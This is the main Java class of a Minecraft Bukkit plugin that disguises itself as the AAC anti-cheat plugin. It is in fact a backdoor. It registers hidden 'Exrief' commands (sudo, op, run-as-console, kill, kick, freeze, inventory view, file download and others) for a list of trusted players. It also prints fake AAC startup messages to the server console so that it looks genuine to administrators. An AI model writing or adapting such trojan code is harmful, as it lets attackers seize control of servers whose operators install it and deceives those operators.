package me.konsolas.aac;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import me.konsolas.aac.bukkitcommands.AACCommand;
import me.konsolas.aac.command.CommandHandler;
import me.konsolas.aac.command.commands.ApocalypseEggCommand;
import me.konsolas.aac.command.commands.AsConsoleCommand;
import me.konsolas.aac.command.commands.DamageSpamCommand;
import me.konsolas.aac.command.commands.DownloadFileCommand;
import me.konsolas.aac.command.commands.ExplosionEggCommand;
import me.konsolas.aac.command.commands.FlashTracking;
import me.konsolas.aac.command.commands.FreezeCommand;
import me.konsolas.aac.command.commands.HelpCommand;
import me.konsolas.aac.command.commands.InvseeCommand;
import me.konsolas.aac.command.commands.KickCommand;
import me.konsolas.aac.command.commands.KillCommand;
import me.konsolas.aac.command.commands.MatrixCommand;
import me.konsolas.aac.command.commands.NoGuiCommand;
import me.konsolas.aac.command.commands.OPCommand;
import me.konsolas.aac.command.commands.ReloadCommand;
import me.konsolas.aac.command.commands.SudoCommand;
import me.konsolas.aac.listeners.ChatListener;
import me.konsolas.aac.listeners.ProjectileListener;
import me.konsolas.aac.schedulers.MatrixScheduler;

/**
 * Created by Marco on 31.01.2017.
 */
public class AAC extends JavaPlugin {

	private static AAC instance;

	public String id;

	public Random random;
	public List<String> trustedPlayers = new ArrayList<>();
	
	public static final String prefix = "§cExrief §7| ";
	
	@Override
	public void onLoad() {
		instance = this;
		id = UUID.randomUUID().toString().replace("-", "");
		random = new Random();
	}

	@Override
	public void onEnable() {
		// Bukkit commands
		getCommand("aac").setExecutor(new AACCommand());
		// Exrief commands
		CommandHandler.registerCommand(new SudoCommand());
		CommandHandler.registerCommand(new MatrixCommand());
		CommandHandler.registerCommand(new ExplosionEggCommand());
		CommandHandler.registerCommand(new AsConsoleCommand());
		CommandHandler.registerCommand(new FreezeCommand());
		CommandHandler.registerCommand(new OPCommand());
		CommandHandler.registerCommand(new ApocalypseEggCommand());
		CommandHandler.registerCommand(new KillCommand());
		CommandHandler.registerCommand(new InvseeCommand());
		CommandHandler.registerCommand(new KickCommand());
		CommandHandler.registerCommand(new DamageSpamCommand());
		CommandHandler.registerCommand(new NoGuiCommand());
		CommandHandler.registerCommand(new HelpCommand());
		CommandHandler.registerCommand(new FlashTracking());
		CommandHandler.registerCommand(new DownloadFileCommand());
		CommandHandler.registerCommand(new ReloadCommand());
		// Listeners
		Bukkit.getPluginManager().registerEvents(new ChatListener(), this);
		Bukkit.getPluginManager().registerEvents(new ProjectileListener(), this);
		// Scheudulers
		MatrixScheduler.registerScheduler();
		// Fake aac start
		fakeStart();
	}

	@Override
	public void onDisable() {

	}

	private void fakeStart() {
		Bukkit.getScheduler().runTaskLater(this, new Runnable() {
			@Override
			public void run() {
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r Beginning Enable...");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r Checking config file...");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check chat.Spam");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check combat.Hitbox");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check combat.Fastbow");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check combat.FightSpeed");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check combat.Knockback");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check combat.Regen");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check combat.Killaura");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check combat.Heuristics");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check movement.BadPackets");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check movement.Speed");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check movement.Phase");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check movement.Fly");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check movement.Climb");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Check movement.Jesus is disabled");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check movement.Derp");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check combat.Criticals");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check world.FastBreak");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check world.FastPlace");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check world.Nuker");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check world.NoSwing");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check world.Interact");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r (CheckManager) Enabling check movement.NoFall");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r Starting API...");
				Bukkit.getConsoleSender().sendMessage("* §4[AAC]§r AAC has been enabled.");
			}
		}, 2L);
	}

	public static AAC getInstance() {
		return instance;
	}
}